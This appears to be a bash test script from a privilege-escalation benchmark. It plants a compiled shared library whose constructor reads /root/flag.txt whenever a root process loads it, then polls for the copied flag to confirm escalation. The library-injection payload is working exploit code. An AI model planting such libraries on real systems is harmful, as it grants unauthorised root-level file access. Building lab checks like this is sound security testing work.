#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/dlopen_flag
cat >/tmp/dlopen.c <<'\''EOF'\''
#include <stdio.h>
#include <unistd.h>
__attribute__((constructor)) static void pwn(void) {
  if (geteuid() != 0) return;
  FILE *f = fopen("/root/flag.txt", "r");
  FILE *o = fopen("/tmp/dlopen_flag", "w");
  if (!f || !o) return;
  char b[256];
  while (fgets(b, sizeof b, f)) fputs(b, o);
  fclose(f); fclose(o);
}
EOF
gcc -shared -fPIC -o /opt/bench/evil/libpayload.so /tmp/dlopen.c
for i in $(seq 1 45); do
  if test -r /tmp/dlopen_flag && grep -q FLAG /tmp/dlopen_flag 2>/dev/null; then
    cat /tmp/dlopen_flag
    exit 0
  fi
  sleep 1
done
exit 1
')"
assert_root_output "${out}"
